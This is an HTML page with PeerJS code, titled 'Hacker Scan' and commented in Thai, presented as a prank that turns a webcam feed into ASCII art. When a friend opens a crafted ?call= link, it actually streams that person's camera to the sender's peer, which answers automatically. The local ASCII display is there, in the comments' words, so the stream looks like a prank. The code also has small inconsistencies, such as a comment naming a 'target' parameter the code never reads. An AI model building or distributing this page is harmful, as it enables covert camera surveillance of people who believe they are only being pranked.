<!DOCTYPE html>
<html>
<head>
    <title>Hacker Scan - v.01</title>
    <style>
        body { background: black; color: #fff; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        #ascii-display { font-size: 10px; line-height: 9px; white-space: pre; letter-spacing: 1px; color: #fff; font-weight: bold; }
        .ui { position: absolute; bottom: 20px; color: #444; font-size: 12px; }
        #status { color: #ff0000; margin-bottom: 10px; }
    </style>
</head>
<body>

    <div id="status">WAITING FOR TARGET...</div>
    <pre id="ascii-display"></pre>
    <div class="ui">ENCRYPTED STREAM - 24H GROUP MONITORING</div>

    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    
    <script>
        const asciiDisplay = document.getElementById('ascii-display');
        const status = document.getElementById('status');
        const CHAR_SIZE = 12;
        const chars = "@#8&WMHB*pxoI;:. ";
        
        // --- ส่วนของ PeerJS (ระบบส่งภาพ) ---
        // ถ้าคุณเป็นคนดู (Host) ให้ใส่ ID ว่า 'master-hacker' 
        // ถ้าเพื่อนเปิด ลิงก์จะทำการโทรหา 'master-hacker' อัตโนมัติ
        const peer = new Peer(); 

        peer.on('open', (id) => {
            console.log('My ID is: ' + id);
            // ถ้าอยากแกล้งเพื่อน ให้ส่งลิงก์ที่มีพารามิเตอร์ไป เช่น ?target=master-hacker
            const urlParams = new URLSearchParams(window.location.search);
            const targetId = urlParams.get('call');
            
            if (targetId) {
                startCam(targetId); // ถ้ามี ID เป้าหมาย ให้เริ่มส่งกล้องทันที
            } else {
                status.innerText = "YOUR ID: " + id + " (ส่ง ID นี้ให้เพื่อน หรือเติม ?call=[ID] ในลิงก์)";
            }
        });

        async function startCam(targetId) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                status.innerText = "TARGET IDENTIFIED - STREAMING...";
                
                // ส่งวิดีโอไปให้เครื่อง Master
                peer.call(targetId, stream);
                
                // แสดงผล ASCII บนจอเพื่อนด้วย จะได้ดูเนียนว่าเป็นการแกล้ง
                renderAscii(stream);
            } catch (err) {
                status.innerText = "ERROR: ACCESS DENIED";
            }
        }

        // รับสาย (สำหรับเครื่องที่จะใช้ดูเพื่อน)
        peer.on('call', (call) => {
            call.answer(); // รับสายอัตโนมัติ
            call.on('stream', (remoteStream) => {
                renderAscii(remoteStream); // แสดงภาพเพื่อนที่ส่งมาเป็น ASCII
                status.innerText = "RECEIVING LIVE FEED...";
            });
        });

        // --- ส่วนของการแปลง ASCII (ยกมาจากที่เราทำกัน) ---
        function renderAscii(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            video.onloadedmetadata = () => {
                const w = Math.floor(video.videoWidth / CHAR_SIZE);
                const h = Math.floor(video.videoHeight / CHAR_SIZE);
                canvas.width = w; canvas.height = h;

                function draw() {
                    ctx.drawImage(video, 0, 0, w, h);
                    const pixels = ctx.getImageData(0, 0, w, h).data;
                    let frame = "";
                    for (let y = 0; y < h; y++) {
                        for (let x = 0; x < w; x++) {
                            const i = (y * w + x) * 4;
                            const brightness = (pixels[i] + pixels[i+1] + pixels[i+2]) / 3;
                            const charIdx = Math.floor((brightness / 256) * chars.length);
                            frame += chars[chars.length - 1 - charIdx];
                        }
                        frame += "\\n";
                    }
                    asciiDisplay.innerText = frame;
                    requestAnimationFrame(draw);
                }
                draw();
            };
        }
    </script>
</body>
</html>
